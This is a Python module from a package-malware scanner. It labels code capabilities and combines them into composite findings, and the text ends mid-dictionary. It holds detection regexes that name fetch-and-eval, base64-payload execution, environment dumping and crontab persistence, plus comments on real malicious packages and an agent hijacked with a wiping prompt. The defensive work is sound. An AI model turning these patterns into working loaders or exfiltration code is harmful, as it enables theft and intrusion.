"""Capability detection and composite reasoning.

This is where the language-agnostic detection model becomes real.

The detector does two distinct jobs, and separating them is the whole design.

**Labelling.** It runs the capability rules over a file's bytes and records what
that file can do: decode, execute, spawn, read credentials, reach the network,
persist. On their own these are observations, not accusations. Every one has
legitimate uses, and reporting them individually would drown a user in noise.

**Reasoning.** It then evaluates composite rules over those labels. A file that
decodes a string *and* executes it is a second-stage loader. A file that reads
credentials *and* reaches the network *and* spawns a process is an exfiltrator.
Neither conclusion is available from any single pattern, which is why signature
matching alone plateaus so quickly.

The reason this generalises across languages is that the primitives are forced
by the attacker's objective rather than chosen by them. To exfiltrate data, code
must read something sensitive and send it somewhere. To run a second stage, it
must decode a payload and execute it. Those constraints hold in every language,
so a new language supplies pattern data for six names and inherits the entire
composite rule set unchanged.
"""

from __future__ import annotations

import ast
import re
from collections import Counter
from contextlib import suppress
from dataclasses import replace
from typing import TYPE_CHECKING, ClassVar

from cordon_scanner.analysis.javascript.js_persist import JsPersistence
from cordon_scanner.analysis.nix.nix_code import NixCode
from cordon_scanner.analysis.python.inert_literals import InertLiterals
from cordon_scanner.analysis.python.pyast import CREDENTIAL_VARIABLE
from cordon_scanner.analysis.python.pysyntax import PythonSyntax
from cordon_scanner.analysis.shared import embedded
from cordon_scanner.decide.scoring import RiskScorer, ScoringContext
from cordon_scanner.detect.base import (
    BaseDetector,
    DetectorRequirements,
    FileUnit,
    RuleSelector,
    ScanContext,
)
from cordon_scanner.detect.code.capability.build_output import BuildOutput
from cordon_scanner.detect.code.capability.hits import CapabilityHit, LineRanges
from cordon_scanner.detect.code.capability.javascript import JavaScriptCapabilities
from cordon_scanner.detect.code.capability.labelling import Labelling
from cordon_scanner.detect.code.capability.load_path import LoadPath
from cordon_scanner.detect.code.capability.memo import CapabilityMemo
from cordon_scanner.detect.code.capability.text_position import TextPosition
from cordon_scanner.detect.code.credential_sweep import CredentialSweep
from cordon_scanner.detect.code.decode_run import DecodeRun
from cordon_scanner.detect.code.install_payload import InstallPayload
from cordon_scanner.detect.code.keychain_owner import KeychainOwner
from cordon_scanner.detect.code.publish_reach import PublishReach
from cordon_scanner.detect.code.store_flow import StoreFlow
from cordon_scanner.detect.infra.gradle_auth import GradleBuildAuth
from cordon_scanner.detect.secrets.secrets import (
    FIXTURE_CEILING,
    RULE_MATERIAL_CEILING,
    SourcePaths,
)
from cordon_scanner.foundation.models import (
    Capability,
    Category,
    Evidence,
    Explanation,
    Finding,
    Location,
    MatchKind,
    Severity,
)
from cordon_scanner.foundation.samples import SampleKinds
from cordon_scanner.foundation.text.redact import Redactor

if TYPE_CHECKING:
    from collections.abc import Iterable

    from cordon_scanner.detect.base import Unit
    from cordon_scanner.foundation.content import FileContent
    from cordon_scanner.rules.loader import CompiledRule


class ScriptFetchedThenEvaluated:
    """Ruby and PHP: a variable read from the network, later handed to an evaluator.

    `body = URI.open(url).read` then `eval(body)`; `$code = file_get_contents("https://...")` then
    `eval($code)`. Two statements, so the one-construct fetch-and-execute patterns do not see it and
    the dropper composite, which deliberately refuses to pair any egress with any eval, stays quiet --
    but here the thing evaluated IS the thing fetched, which is the whole of what that composite asks.
    One hop, by name, within the file: the binding is what makes it evidence, and an eval of some
    other variable in a file that also makes a request is the ordinary case the composite excludes.
    Recorded as `fetch_exec` at the evaluation, so the composites judge it with the context they use.
    """

    RULE_ID = "CAP.SCRIPT.FETCHED_THEN_EVALUATED"
    WINDOW = 4000

    RUBY_SOURCE = re.compile(
        r"(?m)^[ \t]{0,40}([a-z_][A-Za-z0-9_]{0,40})[ \t]{0,4}=[ \t]{0,4}"
        r"(?:URI[ \t]{0,4}\.[ \t]{0,4}open|URI[ \t]{0,4}\.[ \t]{0,4}parse\([^)\n]{0,200}\)[ \t]{0,4}\.[ \t]{0,4}read"
        r"|Net::HTTP[ \t]{0,4}\.[ \t]{0,4}get(?:_response)?|open[ \t]{0,4}\([ \t]{0,4}[\"']https?://"
        r"|(?:HTTParty|Faraday|RestClient)[ \t]{0,4}\.[ \t]{0,4}get)\b"
    )
    RUBY_SINK = r"\b(?:Kernel[ \t]{{0,4}}\.[ \t]{{0,4}})?(?:eval|instance_eval|class_eval|module_eval)[ \t]{{0,4}}\(?[ \t]{{0,4}}{name}\b"
    PHP_SOURCE = re.compile(
        r"\$([A-Za-z_][A-Za-z0-9_]{0,40})[ \t]{0,4}=[ \t]{0,4}"
        r"(?:@[ \t]{0,4})?(?:file_get_contents[ \t]{0,4}\([ \t]{0,4}[\"']https?://|curl_exec[ \t]{0,4}\()"
    )
    PHP_SINK = r"\b(?:eval|assert|create_function|system|exec|shell_exec|passthru|popen|proc_open)[ \t]{{0,4}}\([ \t]{{0,4}}\${name}\b"

    @classmethod
    def hits(cls, content: FileContent, language: str | None) -> list[CapabilityHit]:
        if language == "ruby":
            source, sink = cls.RUBY_SOURCE, cls.RUBY_SINK
        elif language == "php":
            source, sink = cls.PHP_SOURCE, cls.PHP_SINK
        else:
            return []
        text = content.text
        for bound in source.finditer(text):
            name = re.escape(bound.group(1))
            window = text[bound.end() : bound.end() + cls.WINDOW]
            evaluated = re.search(sink.format(name=name), window)
            if evaluated is None:
                continue
            offset = bound.end() + evaluated.start()
            start = len(text[:offset].encode("utf-8"))
            return [
                CapabilityHit(
                    capability=Capability.FETCH_EXEC,
                    rule_id=cls.RULE_ID,
                    byte_start=start,
                    byte_end=start + len(evaluated.group(0).encode("utf-8")),
                    line=text.count("\n", 0, offset) + 1,
                )
            ]
        return []


class CapabilityDetector(BaseDetector):
    """Labels files with capabilities and evaluates composite rules over them."""

    id = "capability"
    # 0.2.0: a spawn whose whole argv is written out no longer satisfies a composite,
    # a capability named in a comment is not a capability, a link-local destination is
    # not egress, and a provisioning script's persistence is ceilinged. The bump is
    # what invalidates a cached result: `ScanCache.detector_signature` is `id@version`
    # and nothing else notices that a detector's behaviour changed.
    # 0.10.0: a presence test on one environment name is not whole-environment
    # access, and a primitive that is called is recorded once rather than twice.
    # 0.11.0: where the pattern tier and the AST tier label the same call differently,
    # the pattern tier wins -- one call is not two of a composite's capabilities.
    # 0.12.0: an encoded command's plaintext reaches the rules, and the
    # minified ceiling no longer excuses a language nobody minifies.
    version = "0.13.0"  # decode-run composites drop a spawn nothing decoded reaches (decode_run)
    categories = frozenset(
        {Category.SUSPICIOUS, Category.MALICIOUS, Category.POLICY, Category.OPERATIONAL}
    )
    requires = DetectorRequirements(content=True)

    def applicable(self, ctx: ScanContext) -> bool:
        """Runs whenever any capability or composite rule is loaded."""
        return any(
            r.rule.capability is not None or r.match.kind is MatchKind.COMPOSITE for r in ctx.rules
        )

    def inspect(self, unit: Unit, ctx: ScanContext) -> Iterable[Finding]:
        if not isinstance(unit, FileUnit):
            return ()
        labelled = self.labelled(unit, ctx)
        if labelled is None:
            return ()
        hits, candidates = labelled
        return list(self._composite_findings(unit, ctx, hits, candidates))

    def labelled(
        self, unit: FileUnit, ctx: ScanContext
    ) -> tuple[list[CapabilityHit], tuple[CompiledRule, ...]] | None:
        """The file's capability hits and the rules selected for it; None when no rule applies.

        What the composites are evaluated over, and what another detector asks when it needs
        to know what a piece of code can do: the manifest asks it of a hook's inline program.
        """
        content = unit.content
        language = unit.language
        if Labelling.rule_pack(content):
            return None
        dotnet_commands: list[embedded.Command] = []
        assembly_view = False

        # Binary files are excluded from content rules. A byte sequence in a PNG
        # that happens to spell a pattern is a false positive with no upside,
        # and the file was never source to begin with.
        #
        # A compiled .NET assembly is the exception: its metadata says, in readable form, every
        # member it calls and every string literal its code uses (`detect/dotnet_meta.py`). The
        # C# rules read that view as they read source, and a literal that is a command line goes
        # to the shell rules as a command written in source does (review 98: 22 of 23 malicious
        # NuGet releases carried their payload only in a DLL).
        if content.path.lower().endswith(".class") and content.raw[:4] == b"\xca\xfe\xba\xbe":
            return Labelling.jvm_class(unit, ctx)
        assembly = content.path.lower().endswith((".dll", ".exe")) and content.raw[:2] == b"MZ"
        if content.is_binary or assembly:
            if not assembly or content.size > 30_000_000:
                return None
            from cordon_scanner.analysis.dotnet.dotnet_meta import DotNetMetadata
            from cordon_scanner.foundation.content import FileContent

            data = content.raw
            if len(data) < content.size and content.window_source is not None:
                # An assembly past `max_file_bytes` keeps its metadata near the end: read it whole
                # (bounded above), or padding a DLL past the limit would hide what it calls.
                from contextlib import suppress

                from cordon_scanner.foundation.files.windows import WindowSourceChanged

                with suppress(OSError, WindowSourceChanged), content.window_source.reader() as read:
                    data = read(0, content.size)
            view = DotNetMetadata.view(data)
            if view is None:
                return None
            raw = view.encode("utf-8")
            content = FileContent(path=content.path, raw=raw, size=len(raw))
            language = "csharp"
            assembly_view = True
            for number, line in enumerate(view.splitlines(), 1):
                if line.startswith('"') and Labelling.DOTNET_COMMAND.search(line):
                    text = line[1:-1].replace('\\"', '"').replace("\\\\", "\\")
                    dotnet_commands.append(embedded.Command(text[:4000], number))

        candidates = RuleSelector.select_rules(ctx.rules, language=language, path=content.path)
        if not candidates:
            return None

        matched_content = content
        if unit.language == "go" and content.size <= 2_000_000:
            # What the file builds at run time -- commands added up from a table of characters,
            # paths and endpoints XOR-decoded from byte tables -- written beside where it is built
            # (`detect/go_eval.py`), so the rules read the paths and hosts the code reaches.
            from cordon_scanner.analysis.go.go_eval import GoEval
            from cordon_scanner.foundation.content import FileContent

            view = GoEval.resolve(content.text)
            if view != content.text:
                raw = view.encode("utf-8")
                matched_content = FileContent(path=content.path, raw=raw, size=len(raw))
        if assembly_view:
            # A compiled assembly's member list puts every API it references within a few lines
            # of every other, so "a request beside an execution" says nothing there: on 489 benign
            # NuGet packages it blocked 121 (review 98). It is judged by the command lines its
            # code carries, read by the shell rules as commands written in source are.
            hits: list[CapabilityHit] = []
        else:
            hits = CapabilityMemo.hits(Labelling, matched_content, candidates, language)
            hits.extend(Labelling.folded_capabilities(matched_content, candidates, language, hits))
        resolved, commands = Labelling.resolved_capabilities(unit, content, ctx)
        commands = commands + dotnet_commands
        if not commands and language not in ("python", "csharp"):
            source = content.text
            if unit.language == "go":
                # A command assembled from a table of characters is read as the command it
                # becomes (`detect/go_eval.py`): the 2025 Go typosquats never wrote theirs down.
                from cordon_scanner.analysis.go.go_eval import GoEval

                source = GoEval.resolve(source)
            commands = embedded.EmbeddedCommands.extract(source, unit.language)
        # And the plaintext of any encoded command among them, so the shell rules
        # see what `powershell -EncodedCommand` was given rather than only that it
        # was given something. See `embedded.decode_encoded_commands`: this is the
        # seam that made 109 of 171 missed malicious packages invisible.
        if NixCode.is_nix(content.path):
            # A Nix file's shell is in its strings: a service's `script`, a build phase, an
            # activation. Read as shell, as a spawned command line is (`detect/nix_code.py`).
            commands.extend(
                embedded.Command(text, line) for text, line in NixCode.shell(content.text)
            )
        commands = embedded.EmbeddedCommands.decode_encoded_commands(commands)
        # And the plaintext of an encoded command the script runs at its own top
        # level, which is handed to no call and so reaches neither branch above.
        if unit.language in embedded.SCRIPT_LANGUAGES:
            commands.extend(embedded.EmbeddedCommands.encoded_commands_in(content.text))
        hits.extend(resolved)
        hits.extend(Labelling.ast_rule_capabilities(content, candidates, unit.language))
        if unit.language == "python" and any(
            h.capability
            in (Capability.EXECUTE, Capability.CREDENTIAL, Capability.DECODE, Capability.PERSIST)
            or h.rule_id == "CAP.EGRESS.DNS_CONSTRUCTED.001"
            for h in hits
        ):
            hits = Labelling.drop_excused_pattern_hits(content, hits)
        if unit.language in ("javascript", "typescript"):
            hits = JsPersistence.drop_named_only(content, hits)
        if GradleBuildAuth.is_build_script(content.path) and any(
            h.capability is Capability.CREDENTIAL for h in hits
        ):
            # A build's own signing passwords and publishing tokens (`detect/gradle_auth.py`).
            hits = GradleBuildAuth.drop_build_auth(content.text, hits, Capability.CREDENTIAL)
        hits.extend(Labelling.embedded_capabilities(ctx, content, commands))
        hits.extend(Labelling.destination_capabilities(content, unit.language))
        hits.extend(JavaScriptCapabilities.js_downloaded_and_run(content, unit.language))
        hits.extend(JavaScriptCapabilities.js_wallet_secret_sent(content, unit.language))
        hits.extend(JavaScriptCapabilities.js_flows(content, unit.language))
        from cordon_scanner.detect.code.js_campaigns import JsCampaigns

        hits.extend(JsCampaigns.channel_follow(content, unit.language))
        hits.extend(JsCampaigns.plants_agent_config(ctx, content, unit.language))
        hits.extend(JsCampaigns.attribution_cloak(content, unit.language))
        computed = JavaScriptCapabilities.js_computed_require(content, unit.language)
        hits.extend(computed)
        if computed and not BuildOutput.bundled(content):
            # The same, in a hand-written file: the install-time composite may convict on this alone.
            # A bundle's loader computes module names by construction (review 98: two extensions'
            # dist/extension.js).
            first = computed[0]
            hits.append(replace(first, rule_id="CAP.JS.COMPUTED_REQUIRE_SOURCE"))
        hits.extend(JavaScriptCapabilities.js_spelled_names(content, unit.language))
        hits.extend(JavaScriptCapabilities.js_string_code_run(content, unit.language))
        hits.extend(CredentialSweep.hits(matched_content))
        hits.extend(Labelling.browser_secrets_decrypted(matched_content))
        if unit.language == "go":
            from cordon_scanner.detect.code.go_runs import GoRuns

            hits.extend(GoRuns.ci_environment_write(matched_content))
            hits.extend(GoRuns.received_and_run(content))
        if unit.language in ("javascript", "typescript"):
            from cordon_scanner.detect.code.js_runs import JsRuns

            hits.extend(JsRuns.received_and_run(content))
            hits.extend(JsRuns.decoded_program_run(content))
            hits.extend(JsRuns.command_output_sent(content, ctx))
        hits.extend(ScriptFetchedThenEvaluated.hits(content, unit.language))
        # A truncated file is reported by the engine, which reads every file and so sees every
        # truncation; this detector returns early for some.
        # The rest of an oversized file is read by the engine, in windows, with every rule here
        # and the other text detectors (`core/windows.py`), on the serial path and in the pool.
        if NixCode.is_nix(content.path):
            # What a Nix file declares does not run (`detect/nix_code.py`).
            hits = NixCode.keep_running(content.text, hits)
        hits = TextPosition.off_this_machine(content, hits)
        if BuildOutput.bundled(content):
            # A compiled tool that schedules its own jobs (an agent runner's LaunchAgent, a
            # crontab writer) registers autostart entries as its feature; three Open VSX agent
            # extensions do it from dist/. The hand-written file is where an implant's is
            # (review 98).
            hits = [h for h in hits if h.rule_id != "CAP.JS.AUTOSTART.001"]
        return hits, candidates

    # -- Labelling -------------------------------------------------------

    """Asking whether a tool exists, which is not using it.

    vLLM's `run-benchmarks.sh` opens with
    `(which wget && which curl) || (apt-get update && apt-get install -y wget curl)`,
    and the egress primitive matched the word `curl`. With `bash -c` on another line
    that was `MALWARE.DROPPER.001` at CRITICAL, and pm2's `setup.deb.sh` does the same
    thing with `if command -v curl > /dev/null`.

    Anchored at the end, so it is the text immediately before the match that decides:
    `which curl` is a probe and `curl https://x/y` one line later is still a fetch."""

    """The commands an egress pattern is looking for, so their position can be found.

    The shell egress patterns are anchored at the start of the line, with a
    comment-excluding prefix before the command name, which means the MATCH begins at
    the line start and says nothing about what sits
    immediately before the command. Rather than rewrite six patterns in the pack and
    lose their own comment guard, the commands are located again here."""

    """The keywords that make what follows a definition rather than a call.

    `google/zx` exports a function called `fetch`, and the egress pattern matched it:
    `export function fetch(` was that repository's only blocking finding. Defining a
    name is not using the thing it is named after."""

    """A typed parameter list, which only a declaration has.

    Tailwind's integration helpers declare
    `exec(command: string, options?: ChildProcessOptions): Promise<string>` on an
    interface. A call passes values; `name: Type` in the parentheses is a signature, and
    so is an empty list followed by a return type."""

    """An opening parenthesis that ends its line, so the parameters are below it."""

    """`name: Type` opening a line: a parameter in a signature laid out one to a line."""

    """How many lines below an open parenthesis to look for a typed parameter.

    Three. A signature that has not named a typed parameter within three lines of
    its parenthesis is not being recognised from its first line either."""

    #: Composites whose severity does not depend on where the code runs. An orchestrator starts
    #: its agent with the checks off on purpose, from its activation code as anywhere; what makes
    #: that an attack is the instruction it carries, which is `MALWARE.AGENT.HIJACK.001`.
    CONTEXT_FREE: ClassVar[frozenset[str]] = frozenset({"SUSPECT.AGENT.UNATTENDED.001"})

    LOOPBACK: ClassVar[re.Pattern[bytes]] = re.compile(
        rb"\b(?:127\.0\.0\.1|localhost|0\.0\.0\.0)\b|\[::1\]|['\"]::1['\"]"
    )
    ELSEWHERE: ClassVar[re.Pattern[bytes]] = re.compile(
        rb"\b[a-z][a-z0-9+.-]{1,20}://|\b(?:\d{1,3}\.){3}\d{1,3}\b|"
        rb"\b[a-z0-9-]{1,63}\.(?:com|net|org|io|dev|app|xyz|ru|cn|top|me|co|sh|site|online)\b",
        re.IGNORECASE,
    )

    """What a CI check asks beside, when it is a courtesy and not an evasion.

    `if (process.env.DO_NOT_TRACK === '1' || process.env.CI) return;` before a licence ping, and
    `if (!process.stderr.isTTY || process.env.CI) return;` before a progress line: 29 of
    `@readystack`'s MCP linters, 37 MCP servers and 139 units of the 200K corpus were blocked as
    code hiding from analysis for these. A payload gated on not being watched has no reason to
    honour the user's opt-out or to care whether a terminal is attached; both are how a program
    is polite, and an evasion that adds one still needs another environment check, a debugger or
    a hostname test, each of which matches on its own.
    """

    SHIPPED_OUTPUT: ClassVar[re.Pattern[str]] = re.compile(
        r"(?:^|/)(?:build|bin|dist)/[^!]{1,400}\.(?:c?js|mjs)$"
    )
    """JavaScript under `build/`, `bin/` or `dist/` in a published npm package.

    In a repository those directories hold the project's own tooling, and a decode beside a
    spawn there is usually a release helper. In the tarball npm installs they are the compiled
    library and the command npm links onto PATH: `@0xengine/meow` shipped `build/validate.js`,
    which writes a base64 script to disk and runs it with bash, and the tooling ceiling held it
    at MEDIUM (review 98).
    """

    #: Findings whose evidence is a value followed from where it is read to where it goes
    #: (`analysis/javascript/js_flow.py`), not two patterns near each other: a server's reply reaching an
    #: evaluator, the machine's identity or a credential file reaching a request.
    FLOW_EVIDENCE_RULES: ClassVar[frozenset[str]] = frozenset(
        {
            "SUSPECT.DROPPER.REMOTE_CODE.001",
            "SUSPECT.EXFIL.FLOW_IDENTITY.001",
            "SUSPECT.EXFIL.FLOW_SECRET.001",
        }
    )

    @staticmethod
    def _flow_in_shipped_code(rule_id: str, content: FileContent, ctx: ScanContext) -> bool:
        """A followed flow in the code a published npm package runs: its library entry points (`main`,
        `exports`) and what its install hooks load. There `dist/` and the minified bundle are not
        build output beside the code -- they are the code (review 98, 17-PROOF-REVIEW: the
        generated-output and minified ceilings lowered 21 study-half misses' flow findings).
        Proximity findings keep the ceilings: a bundle holds a loader's decoder and evaluator."""
        return (
            rule_id in CapabilityDetector.FLOW_EVIDENCE_RULES
            and ctx.package_distribution
            and ctx.distribution == "npm"
            # Not a `bin` target alone: a CLI that fetches and runs its plugins or its update runs
            # when a person runs it (review 98: both benign blocks were `bin` tools).
            and (content.path in ctx.library_entry_paths or ctx.in_install_hook(content.path))
        )

    @staticmethod
    def _shipped_output(path: str, ctx: ScanContext) -> bool:
        return (
            ctx.package_distribution
            and ctx.distribution == "npm"
            and CapabilityDetector.SHIPPED_OUTPUT.search(path) is not None
        )

    """What follows an enumeration of `process.env` when it reads one family of variables or
    passes the environment to a child: `Object.keys(process.env).filter(k => /^debug_/i.test(k))`
    is the `debug` package's options, `startsWith("LANGCHAIN_")` is LangChain's configuration,
    and `ELECTRON_RUN_AS_NODE` is vscode-languageclient starting its server. Each is bundled into
    thousands of extensions, and 6 of 8 benign ones blocked as credential theft were these (review
    98). The environment dumped whole, or sent anywhere, still matches."""

    @staticmethod
    def _loopback_only(region: bytes) -> bool:
        """Whether every destination named in `region` is this machine."""
        if not CapabilityDetector.LOOPBACK.search(region):
            return False
        for found in CapabilityDetector.ELSEWHERE.finditer(region):
            text = found.group(0).lower()
            if text.endswith(b"://"):
                tail = region[found.end() : found.end() + 40].lower()
                if not CapabilityDetector.LOOPBACK.match(tail):
                    return False
            elif text not in (b"127.0.0.1", b"0.0.0.0"):
                return False
        return True

    PERSIST_RULE = "MALWARE.INSTALL.PERSIST.001"
    CALLBACK_RULE = "MALWARE.EXFIL.INSTALL_CALLBACK.001"

    WRITE_NEAR: ClassVar[re.Pattern[bytes]] = re.compile(
        rb"appendFile|writeFile|createWriteStream|\bfs\s*\.\s*write|\.write\s*\(|>>|"
        rb"\btee\s+-a\b|\bechos?\s[^\n]{0,80}>|\bcrontab\s+-|\bsystemctl\s"
    )
    """A write, or the command that installs a unit, close to where persistence is named."""

    FORMULA: ClassVar[re.Pattern[bytes]] = re.compile(
        rb"^class\s+\w+\s*<\s*(?:Portable)?Formula\b", re.MULTILINE
    )

    #: Ruby's ways of writing a file, which a formula would have to use to plant anything.
    RUBY_WRITE: ClassVar[re.Pattern[bytes]] = re.compile(
        rb"\bappend_lines\b|\bwrite\b|\bputs\b|\bFile\s*\.\s*open\b|\batomic_write\b|"
        rb"\bFileUtils\b|\bln_s|\bcp\b|>>"
    )

    @staticmethod
    def _is_formula(content: FileContent) -> bool:
        """A Homebrew formula: Ruby declaring `class Name < Formula`."""
        return content.path.endswith(".rb") and bool(CapabilityDetector.FORMULA.search(content.raw))

    @staticmethod
    def _writes_near(
        content: FileContent,
        hits: list[CapabilityHit],
        reach: int = 160,
        writes: re.Pattern[bytes] | None = None,
    ) -> bool:
        """Whether a persistence location in `hits` is written, not only named."""
        raw = content.raw
        return any(
            (writes or CapabilityDetector.WRITE_NEAR).search(
                raw, max(0, h.byte_start - reach), min(len(raw), h.byte_end + reach)
            )
            for h in hits
            if h.capability is Capability.PERSIST
        )

    #: Files a person runs to set up a machine, by name or extension: never imported, never run
    #: by a package manager on someone else's behalf.
    HAND_RUN_PROVISIONING_NAMES: ClassVar[frozenset[str]] = frozenset(
        {"vagrantfile", "dockerfile", "containerfile"}
    )
    HAND_RUN_PROVISIONING_SUFFIXES: ClassVar[tuple[str, ...]] = (
        ".sh",
        ".bash",
        ".zsh",
        ".ksh",
        ".ps1",
        ".psm1",
        ".bat",
        ".cmd",
        ".dockerfile",
        ".patch",
        ".diff",
        ".nix",
        ".tpl",
        ".tmpl",
        ".j2",
        ".postinst",
        ".preinst",
        ".chroot",
    )

    #: The whole environment turned into data: what a client reading its own key never does.
    _ENVIRONMENT_DUMP = re.compile(
        rb"\$\(\s{0,4}(?:env|printenv|set)\s{0,4}\)|`\s{0,4}(?:env|printenv)\s{0,4}`|\bprintenv\b"
        rb"|JSON\.stringify\(\s{0,4}process\.env\s{0,4}[,)]"
        rb"|\b(?:str|repr|json\.dumps)\(\s{0,4}(?:dict\(\s{0,4})?os\.environ\b"
    )

    #: A URL to a public IPv4 address. Loopback, unspecified and private ranges are this machine
    #: or its network -- `allow_origins=["http://127.0.0.1:3000"]` in a server's CORS list names
    #: no destination anything is sent to (review 98, mcp-variants).
    _RAW_IP_URL = re.compile(
        rb"(?i)\b(?:https?|wss?|tcp)://"
        rb"(?!(?:127|10|0)\.|192\.168\.|172\.(?:1[6-9]|2\d|3[01])\.)"
        rb"(?:\d{1,3}\.){3}\d{1,3}(?![\d.])"
    )

    _CHAT_CLIENT: ClassVar[re.Pattern[bytes]] = re.compile(
        rb"(?m)^[ \t]{0,8}(?:import|from)[ \t]{1,4}(?:discord|telebot|telegram|aiogram|pyrogram|telethon)\b"
        rb"|\brequire[ \t]{0,4}\([ \t]{0,4}['\"](?:discord\.js|node-telegram-bot-api|telegraf)['\"]"
        rb"|\bfrom[ \t]{1,4}['\"](?:discord\.js|node-telegram-bot-api|telegraf)['\"]"
    )
    """A chat bot's client library: the channel a webhook URL is, without the URL."""

    @staticmethod
    def _names_untrusted_destination(raw: bytes) -> bool:
        """A paste site, tunnel, webhook catcher or interaction service, or a bare IPv4 URL."""
        from cordon_scanner.analysis.shared.destinations import Destinations

        if CapabilityDetector._RAW_IP_URL.search(raw):
            return True
        return (
            Destinations.could_match(raw)
            and Destinations.destination_matcher().search(raw) is not None
        )

    @staticmethod
    def _is_hand_run_provisioning(path: str, language: str | None) -> bool:
        name = path.rpartition("!")[2].rpartition("/")[2].lower()
        return (
            name in CapabilityDetector.HAND_RUN_PROVISIONING_NAMES
            or name.startswith(("dockerfile.", "vagrantfile."))
            or name.endswith(CapabilityDetector.HAND_RUN_PROVISIONING_SUFFIXES)
            or language in ("shell", "powershell", "batch", "dockerfile")
        )

    #: A fetch on the same line as the persistence: `curl ... >> ~/.bashrc`, `wget -O
    #: /etc/systemd/system/x.service`, a crontab line that runs a download.
    _FETCH_VERB = re.compile(
        rb"(?i)\b(?:curl|wget|Invoke-WebRequest|iwr|Invoke-RestMethod|irm|DownloadString|DownloadFile)\b"
    )

    #: A variable filled by a fetch: `body="$(curl ...)"`, `$r = Invoke-WebRequest ...`.
    _FETCHED_VARIABLE = re.compile(
        rb"(?im)^[ \t]{0,16}(?:export[ \t]{1,4}|local[ \t]{1,4})?\$?([A-Za-z_][A-Za-z0-9_]{0,40})"
        rb"[ \t]{0,4}=[ \t]{0,4}[\"'(]{0,3}(?:\$\(|`)?[ \t]{0,4}(?:curl|wget|Invoke-WebRequest|iwr"
        rb"|Invoke-RestMethod|irm)\b"
    )

    @staticmethod
    def _persists_a_download(content: FileContent, hits: list[CapabilityHit]) -> bool:
        """Whether a line that persists also fetches, or writes out a variable a fetch filled."""
        raw = content.raw
        fetched = {m.group(1) for m in CapabilityDetector._FETCHED_VARIABLE.finditer(raw)}
        for hit in hits:
            if hit.capability is not Capability.PERSIST:
                continue
            start = raw.rfind(b"\n", 0, hit.byte_start) + 1
            end = raw.find(b"\n", hit.byte_end)
            line = raw[start : end if end >= 0 else len(raw)]
            if CapabilityDetector._FETCH_VERB.search(line):
                return True
            if any(re.search(rb"\$\{?" + re.escape(name) + rb"\b", line) for name in fetched):
                return True
        return False

    #: A payload written into the code, decoded and run in one expression: `eval(atob('...'))`,
    #: `new Function(Buffer.from('...', "base64").toString())`, `exec(base64.b64decode(b'...'))`.
    #: Sixty characters of encoding or more: what a module loader decodes is computed, not written.
    _LITERAL_PAYLOAD_RUN = re.compile(
        rb"(?:\beval|\bnew\s{1,4}Function|\bFunction|\bexec)\s{0,4}\(\s{0,4}"
        rb"(?:atob|Buffer\s{0,4}\.\s{0,4}from|decodeURIComponent\s{0,4}\(\s{0,4}escape\s{0,4}\(\s{0,4}atob"
        rb"|base64\s{0,4}\.\s{0,4}b64decode|codecs\s{0,4}\.\s{0,4}decode)\s{0,4}\(\s{0,4}b?['\"`][A-Za-z0-9+/=_-]{60}"
        # The decoder the file defines itself: `eval(_eval('<4 MB of base64>'))` in `1kzr` (review
        # 98, npm work half). Longer literal, since the decoder's name says nothing.
        rb"|(?:\beval|\bnew\s{1,4}Function|\bFunction)\s{0,4}\(\s{0,4}[A-Za-z_$][\w$]{0,40}\s{0,4}\(\s{0,4}"
        rb"['\"`][A-Za-z0-9+/=_-]{400}"
    )

    #: An agent started with its checks off AND told to destroy or to hunt for secrets.
    AGENT_HIJACK_PARTS: ClassVar[frozenset[str]] = frozenset(
        {"CAP.AGENT.UNATTENDED.001", "CAP.AGENT.HARMFUL_INSTRUCTION.001"}
    )

    @staticmethod
    def _turns_an_agent_on_the_user(hits: list[CapabilityHit]) -> bool:
        """Not lowered for sitting in a bundle: the compromised Amazon Q 1.84.0 shipped the
        command and its wiping prompt in its minified main bundle, which is the only place an
        extension's code is."""
        return {hit.rule_id for hit in hits} >= CapabilityDetector.AGENT_HIJACK_PARTS

    @staticmethod
    def _sends_a_wallet_secret(hits: list[CapabilityHit]) -> bool:
        """Not lowered for sitting in a bundle: the compromised `xrpl` releases sent the seed from
        `dist/` and from their browser build, which is the code a consumer runs."""
        return any(hit.rule_id == "CAP.JS.WALLET_SECRET_SENT" for hit in hits)

    @staticmethod
    def _evaluates_a_literal_payload(content: FileContent) -> bool:
        return CapabilityDetector._LITERAL_PAYLOAD_RUN.search(content.raw) is not None

    """Extensions where a thousand characters on one line means a bundler ran.

    The ceiling above exists for one reason, stated in `MINIFIED_LINE`: a minified
    bundle contains a decoder beside an evaluator because that is what a module
    loader is. That is a fact about **bundlers**, and bundlers are a JavaScript and
    CSS practice. Nothing in the Python, Ruby, shell, Go or Rust toolchains emits a
    thousand-character line, so in those languages the same measurement means the
    opposite thing -- somebody obfuscated the file by hand.

    Measured, and it is how this was found. `bettercolor` is a real malicious PyPI
    package whose payload is a pyobfuscate blob in a library module: a 12KB `.py`
    file with a 6,307-character line. It matched `_is_minified`, so the ceiling took
    `SUSPECT.DECODE_CHAIN.001` from critical to medium and a CI gate would have
    passed it. Eleven of 201 sampled malicious packages were held below the gate,
    most of them this way.

    A noise ceiling that fires on obfuscated malware is worse than no ceiling: it
    turns a finding a reader would act on into one they will not see."""

    """Mean bytes per line before a file is build output rather than source.

    The third half of this test, added after the other two were not enough. A
    minifier's whole purpose is to delete newlines, so its output is one line,
    or three, and the mean line length is most of the file. Hand-written source
    averages nearer forty bytes a line however long its longest line is.

    Without this, one long line anywhere in a `.js` file made the whole file
    "minified output". `budi-kue16-riris` is a registry-spam worm -- generate a
    name, rewrite `package.json`, `exec('npm publish')`, repeat -- and it opens
    with two long array literals of Indonesian names and foods to generate the
    names from. Those two lines bought the entire file a ceiling, and
    `SUSPECT.REGISTRY.SELF_PUBLISH.001` came out at MEDIUM instead of HIGH.
    About thirty packages of that family are in the npm corpus and every one of
    them was under the gate for the same reason.

    The fifth time in this release a ceiling meant for noise was found holding
    malware below the line, and the second time for this particular ceiling."""

    EXFIL_RULES = frozenset({"SUSPECT.EXFIL.001", "MALWARE.EXFIL.001"})
    _URL_HOST = re.compile(r"https?://([a-z0-9.-]{3,253})", re.IGNORECASE)
    SERVICE_HOSTS: ClassVar[dict[str, tuple[str, ...]]] = {
        "GITHUB": ("github.com", "githubusercontent.com", "ghcr.io"),
        "GH": ("github.com", "githubusercontent.com", "ghcr.io"),
        "GITLAB": ("gitlab.com",),
        "NPM": ("npmjs.org", "npmjs.com"),
        "PYPI": ("pypi.org", "pythonhosted.org"),
        "TWINE": ("pypi.org",),
        "HF": ("huggingface.co",),
        "HUGGINGFACE": ("huggingface.co",),
        "DOCKER": ("docker.io", "docker.com"),
